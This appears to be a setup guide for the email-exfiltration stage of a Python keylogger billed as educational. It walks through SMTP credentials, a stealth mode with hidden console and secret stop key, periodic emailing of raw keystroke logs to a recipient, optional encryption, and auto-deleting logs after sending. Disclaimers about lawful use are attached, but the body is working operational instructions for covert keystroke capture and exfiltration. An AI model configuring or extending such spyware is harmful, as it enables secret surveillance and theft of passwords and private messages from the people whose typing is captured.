# Configuration Guide - Email Transmission

## 📧 Phase 4: Email Transmission Setup

This guide will help you configure email transmission for the educational keylogger.

---

## 🚀 Quick Start

### 1. Install Dependencies

```bash
pip install -r requirements.txt
```

This will install:
- `pynput` - Keyboard capture
- `cryptography` - Encryption support
- `python-dotenv` - Environment variable management

### 2. Configure Email Settings

Copy the example environment file:
```bash
copy .env.example .env
```

Edit the `.env` file with your email configuration:

```env
# Email Configuration (SMTP)
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
SMTP_EMAIL=your_email@gmail.com
SMTP_PASSWORD=your_app_password_here
RECIPIENT_EMAIL=recipient@gmail.com

# Transmission Settings
TRANSMISSION_INTERVAL=30
AUTO_DELETE_AFTER_SEND=False

# Encryption (optional)
ENCRYPTION_ENABLED=False
ENCRYPTION_KEY=generate_a_key_here
```

---

## 📧 Email Provider Configuration

### Gmail (Recommended)

1. **Enable 2-Factor Authentication** on your Google account
2. **Generate an App Password**:
   - Go to: https://myaccount.google.com/apppasswords
   - Select "Mail" and "Other (Custom name)"
   - Name it "Keylogger" or any name
   - Copy the 16-character password
   
3. **Configure .env**:
```env
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
SMTP_EMAIL=your_email@gmail.com
SMTP_PASSWORD=xxxx xxxx xxxx xxxx  # Your App Password
RECIPIENT_EMAIL=recipient@gmail.com
```

### Outlook/Hotmail

```env
SMTP_SERVER=smtp-mail.outlook.com
SMTP_PORT=587
SMTP_EMAIL=your_email@outlook.com
SMTP_PASSWORD=your_password
RECIPIENT_EMAIL=recipient@outlook.com
```

### Yahoo Mail

```env
SMTP_SERVER=smtp.mail.yahoo.com
SMTP_PORT=587
SMTP_EMAIL=your_email@yahoo.com
SMTP_PASSWORD=your_app_password
RECIPIENT_EMAIL=recipient@yahoo.com
```

### Custom SMTP Server

```env
SMTP_SERVER=mail.yourdomain.com
SMTP_PORT=587
SMTP_EMAIL=your_email@yourdomain.com
SMTP_PASSWORD=your_password
RECIPIENT_EMAIL=recipient@example.com
```

---

## 🔐 Encryption Setup (Optional)

### Generate Encryption Key

```bash
python email_transmitter.py generate-key
```

This will output a key like:
```
Generated encryption key:
xxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXX=

Add this key to your .env file as ENCRYPTION_KEY
```

### Enable Encryption in .env

```env
ENCRYPTION_ENABLED=True
ENCRYPTION_KEY=xxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXXxxxxxXXXX=
```

### Decrypt Received Files

```bash
python email_transmitter.py decrypt encrypted_file.txt.encrypted YOUR_KEY
```

---

## 🎮 Usage Examples

### Basic Usage (No Transmission)

```bash
python main.py
```

### With Email Transmission (Default: 30 minutes)

```bash
python main.py --transmit
```

### Custom Transmission Interval (15 minutes)

```bash
python main.py --transmit --interval 15
```

### Stealth Mode + Transmission

```bash
python main.py --stealth --transmit --interval 20
```

### Full Configuration

```bash
python main.py --stealth --transmit --interval 10 --directory custom_logs --max-size 50
```

---

## 📊 Configuration Options

| Option | Short | Default | Description |
|--------|-------|---------|-------------|
| `--stealth` | `-s` | False | Hidden console, secret stop (Ctrl+Shift+Esc) |
| `--transmit` | `-t` | False | Enable email transmission |
| `--interval` | `-i` | 30 | Transmission interval (minutes) |
| `--directory` | `-d` | logs | Log directory |
| `--max-size` | `-m` | 100 | Max file size before rotation (KB) |

---

## 🧪 Testing Email Configuration

Test your email configuration without running the full keylogger:

```python
from email_transmitter import EmailTransmitter
import os
from dotenv import load_dotenv

load_dotenv()

transmitter = EmailTransmitter(
    smtp_server=os.getenv('SMTP_SERVER'),
    smtp_port=int(os.getenv('SMTP_PORT')),
    sender_email=os.getenv('SMTP_EMAIL'),
    sender_password=os.getenv('SMTP_PASSWORD'),
    recipient_email=os.getenv('RECIPIENT_EMAIL')
)

# Test connection
if transmitter.test_connection():
    print("✅ Email configuration successful!")
else:
    print("❌ Email configuration failed. Check your settings.")
```

---

## 🔍 Troubleshooting

### Error: "SMTP Authentication failed"

**Solutions:**
1. Check that your email and password are correct
2. For Gmail: Use an App Password, not your regular password
3. Enable "Less secure app access" (not recommended) or use App Passwords
4. Check if 2FA is enabled (required for App Passwords)

### Error: "Connection test failed"

**Solutions:**
1. Check your internet connection
2. Verify SMTP server address and port
3. Check if your firewall is blocking port 587
4. Try port 465 with SSL instead of 587 with TLS

### No Emails Received

**Check:**
1. Spam/Junk folder in recipient email
2. Logs for transmission errors
3. Email provider limits (some limit automated emails)
4. Verify RECIPIENT_EMAIL is correct

### Encryption Not Working

**Solutions:**
1. Generate a new key with `python email_transmitter.py generate-key`
2. Make sure the key is correctly copied to .env
3. Set `ENCRYPTION_ENABLED=True` (case sensitive)
4. Keep the encryption key safe - you'll need it to decrypt files!

---

## 📁 Log File Transmission

When transmission is enabled, the keylogger will:

1. **Collect logs** for the specified interval
2. **Send via email** all log files for the current session:
   - Raw keystroke logs (`keylog_session_*.txt`)
   - Human-readable summary (`summary_session_*.txt`)
3. **Log transmission status** in the log files
4. **Optionally delete** logs after successful send (if `AUTO_DELETE_AFTER_SEND=True`)

### Email Format

**Subject:** `Keylogger Report - [SESSION_ID]`

**Body:**
```
Educational Keylogger Report
============================

Session ID: 20251104_153000
Timestamp: 2025-11-04 15:30:00
Files attached: 2

[ENCRYPTED] or [PLAINTEXT]

---
This is an automated report from an educational keylogger project.
For cybersecurity learning purposes only.
```

**Attachments:**
- `keylog_session_[ID]_part_[TIMESTAMP].txt` (or `.encrypted`)
- `summary_session_[ID].txt` (or `.encrypted`)

---

## 🔒 Security Best Practices

1. **Never commit `.env` file** to version control (already in .gitignore)
2. **Use App Passwords** instead of regular passwords
3. **Enable encryption** for sensitive data
4. **Use a dedicated email account** for the keylogger
5. **Delete logs after transmission** if enabled
6. **Keep encryption keys secure** and separate from the code

---

## ⚠️ Legal and Ethical Reminder

**EDUCATIONAL PURPOSE ONLY**

- ✅ Use only on systems you own
- ✅ Get explicit written permission if monitoring others
- ✅ Comply with local laws and regulations
- ❌ Never use for malicious purposes
- ❌ Never use on public or shared computers without permission

---

## 📞 Next Steps

After setting up email transmission, you can:

1. **Test the configuration** with short intervals
2. **Monitor transmission logs** for errors
3. **Explore encryption** for sensitive data
4. **Move to Phase 5**: Network-based transmission (coming soon)

---

## 🆘 Support

If you encounter issues:
1. Check this guide's troubleshooting section
2. Verify your `.env` configuration
3. Test email connection separately
4. Check log files for error messages

---

**Happy Learning! 🎓**

*Remember: With great power comes great responsibility. Use this knowledge ethically.*

